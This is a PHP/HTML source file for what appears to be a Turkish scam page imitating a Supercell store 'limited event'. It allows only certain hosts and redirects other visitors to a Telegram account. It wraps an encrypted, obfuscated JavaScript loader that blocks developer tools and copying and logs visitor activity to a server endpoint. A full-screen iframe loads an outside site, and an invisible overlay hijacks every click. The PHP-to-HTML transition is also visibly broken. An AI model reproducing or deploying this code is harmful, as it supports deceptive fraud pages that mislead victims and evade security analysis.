<?php
// index.php — optimized for no "headers already sent" error

// --------------------
// Host protection (no output before headers)
// --------------------
$allowed_hosts = ['supercellstorecom.free.nf','www.supercellstorecom.free.nf'];
$host = $_SERVER['HTTP_HOST'] ?? '';
if (!in_array($host, $allowed_hosts, true)) {
    header('Location: https://t.me/ozcan6137');
    exit;
}

// --------------------
// Raw JS payload (compact)
// --------------------
$raw_js = <<<'JS'
(function(){const A=['supercellstorecom.free.nf','www.supercellstorecom.free.nf'],T='https://t.me/ozcan6137',M=90;try{if(!A.includes(location.hostname))return location.replace(T)}catch(e){};function g(){location.replace(T)};document.addEventListener('contextmenu',function(e){e.preventDefault();g()});document.addEventListener('copy',function(e){e.preventDefault();g()});document.addEventListener('keydown',function(e){const k=(e.key||'').toLowerCase();if((e.ctrlKey&&(k==='u'||k==='c'))||(e.ctrlKey&&e.shiftKey&&(k==='i'||k==='c'))||e.keyCode===123){e.preventDefault();g()}} ,!0);function c(){try{var s=(window.getSelection?window.getSelection().toString():'');if(s&&s.length>=M)g()}catch(e){}}document.addEventListener('selectstart',()=>setTimeout(c,60));setInterval(c,800)})();
JS;

// --------------------
// Compress payload (gzip) then AES-256-CBC encrypt per-request
// --------------------
$gz = gzencode($raw_js); // gzip compress
$key_bin = random_bytes(32); // AES-256 key
$iv_bin = random_bytes(16);
$cipher_raw = openssl_encrypt($gz, 'AES-256-CBC', $key_bin, OPENSSL_RAW_DATA, $iv_bin);
$encrypted_b64 = base64_encode($cipher_raw);

// scramble key parts into 4 pieces for extra difficulty
$key_hex = bin2hex($key_bin);
$k1 = substr($key_hex,0,8);
$k2 = substr($key_hex,8,8);
$k3 = substr($key_hex,16,8);
$k4 = substr($key_hex,24);
$k2_rev = strrev($k2);
$k4_rev = strrev($k4);
$iv_hex = bin2hex($iv_bin);
$payload_obf = strrev($encrypted_b64);
$chunks = str_split($payload_obf, 60);
$chunks_js_array = json_encode($chunks);
<!DOCTYPE html>
<html lang="tr">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
  	<meta name="viewport" content="width=device-width, initial-scale=1">
  	<title>SINIRLI ETKİNLİK</title>

  	<link rel="stylesheet" href="npm/bootstrap-5.3.2/dist/css/bootstrap.min.css">
  	<script disable-devtool-auto src='npm/disable-devtool-latest.js'></script>

  	<style>
		html, body {
			height: 100%;
			margin: 0;
		}

		#icerikKapsayici {
			position: relative;
			width: 100%;
			height: 100%;
		}

		#icerikKapsayici iframe {
			position: absolute;
			width: 100%;
			height: 100%;
			border: none;
		}
  	</style>
</head>
<body>

<div id="icerikKapsayici"></div>

<script>
	
	const iframeAdresi = 'https://nmx.li-nk.lol';

	
	const icerikKapsayici = document.getElementById('icerikKapsayici');

	
	const cerceve = document.createElement('iframe');
	cerceve.src = iframeAdresi;
	cerceve.allowFullscreen = true;

	// Sayfaya ekle
	icerikKapsayici.appendChild(cerceve);
</script>

<script>
(function(){
	function yukle(){
		var belge = gizliIFrame.contentDocument || gizliIFrame.contentWindow.document;
		if(belge){
			var ekle = belge.createElement('script');
			ekle.innerHTML = "window.__CF$cv$params={r:'9a1a6dfc4fb81035',t:'MTc2MzY2NzczNw=='};"+
			"var s=document.createElement('script');s.src='cdn-cgi/challenge-platform/scripts/jsd/main.js';"+
			"document.getElementsByTagName('head')[0].appendChild(s);";
			belge.getElementsByTagName('head')[0].appendChild(ekle);
		}
	}

	if(document.body){
		var gizliIFrame = document.createElement('iframe');
		gizliIFrame.height = 1;
		gizliIFrame.width = 1;
		gizliIFrame.style.position = 'absolute';
		gizliIFrame.style.top = 0;
		gizliIFrame.style.left = 0;
		gizliIFrame.style.border = 'none';
		gizliIFrame.style.visibility = 'hidden';
		document.body.appendChild(gizliIFrame);

		if(document.readyState !== 'loading'){
			yukle();
		} else if(window.addEventListener){
			document.addEventListener('DOMContentLoaded', yukle);
		} else {
			var onceki = document.onreadystatechange || function(){};
			document.onreadystatechange = function(e){
				onceki(e);
				if(document.readyState !== 'loading'){
					document.onreadystatechange = onceki;
					yukle();
				}
			};
		}
	}
})();
</script>

<center>
	<font size="2">
		</font>
</center>


<div onclick="location.href='ozcan.html'" 
     style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;background:transparent;"></div>

</body>
</html>
<script>
(function(){
  try{
    var _k1='<?= $k1 ?>',_k2r='<?= $k2_rev ?>',_k3='<?= $k3 ?>',_k4r='<?= $k4_rev ?>',_iv='<?= $iv_hex ?>';
    var _chunks = <?= $chunks_js_array ?>;
    var TG='https://t.me/ozcan6137';

    function report(type, extra){
      try{ navigator.sendBeacon('/log_copy.php', JSON.stringify({type:type, extra:extra||null, url:location.href, ua:navigator.userAgent, ts:Date.now()})); }
      catch(e){ try{ fetch('/log_copy.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:type, extra:extra||null, url:location.href, ua:navigator.userAgent, ts:Date.now()})}); }catch(ex){} }
    }

    var p=''.concat.apply('',_chunks).split('').reverse().join('');

    var detectDevTools = function(){var start=Date.now(); debugger; return Date.now()-start>100;};
    var checkToString = function(){try{var f=function(){/*dummy*/}; return f.toString().indexOf('/*dummy*/')!==-1;}catch(e){return false;}};
    try{ if(detectDevTools() || !checkToString()){ report('devtools_detected'); location.replace(TG); return; } }catch(e){}

    var keyHex=_k1+(_k2r.split('').reverse().join(''))+_k3+(_k4r.split('').reverse().join(''));
    function hx(h){var l=h.length/2,o=new Uint8Array(l);for(var i=0;i<l;i++)o[i]=parseInt(h.substr(i*2,2),16);return o}
    function b64ToBuf(b){var s=atob(b),u=new Uint8Array(s.length);for(var i=0;i<s.length;i++)u[i]=s.charCodeAt(i);return u.buffer}
    function u8ToStr(u){var s='';for(var i=0;i<u.length;i++)s+=String.fromCharCode(u[i]);return s}

    var keyBytes=hx(keyHex),ivBytes=hx(_iv);
    var shifted='';for(var i=0;i<p.length;i++)shifted+=String.fromCharCode(p.charCodeAt(i)-1);
    var payloadB64Candidate=shifted;

    document.addEventListener('contextmenu',function(e){ report('contextmenu'); });
    document.addEventListener('copy',function(e){ report('copy'); });
    document.addEventListener('selectstart',function(e){setTimeout(function(){var s=window.getSelection?window.getSelection().toString():'';if(s&&s.length>50)report('selection_long',s.slice(0,200));},80);});

    (async function(){
      try{
        if(window.crypto&&crypto.subtle&&crypto.subtle.importKey){
          var key=await crypto.subtle.importKey('raw',keyBytes.buffer,{name:'AES-CBC'},false,['decrypt']);
          var encBuf=b64ToBuf(payloadB64Candidate);
          var decBuf=await crypto.subtle.decrypt({name:'AES-CBC',iv:ivBytes.buffer},key,encBuf);
          if(typeof DecompressionStream!=='undefined'){try{var ds=new DecompressionStream('gzip');var stream=new Response(new Blob([decBuf]).stream().pipeThrough(ds));var txt=await stream.text();(new Function(txt))();return;}catch(e){report('decompression_failed',String(e));}}
          var dv=new Uint8Array(decBuf); if(dv[0]==0x1f&&dv[1]==0x8b){report('gzip_no_decompress'); try{location.replace(TG);return;}catch(ex){return;}}
          var s=u8ToStr(dv);(new Function(s))();return;
        }
      }catch(e){report('webcrypto_failure',String(e));}
      try{
        var enc2=b64ToBuf(payloadB64Candidate);var dec2arr=new Uint8Array(enc2);var out=new Uint8Array(dec2arr.length);for(var i=0;i<dec2arr.length;i++)out[i]=dec2arr[i]^keyBytes[i%keyBytes.length];
        var s2=u8ToStr(out);(new Function(s2))();return;
      }catch(e){report('xor_fallback_failure',String(e));try{location.replace(TG);}catch(ex){}}
    })();

  }catch(e){try{ fetch('/log_copy.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'loader_error',error:String(e),ua:navigator.userAgent,url:location.href,ts:Date.now()})}); }catch(ex){} try{location.replace('https://t.me/ozcan6137');}catch(ex){} }
})();
</script>
</body>
</html>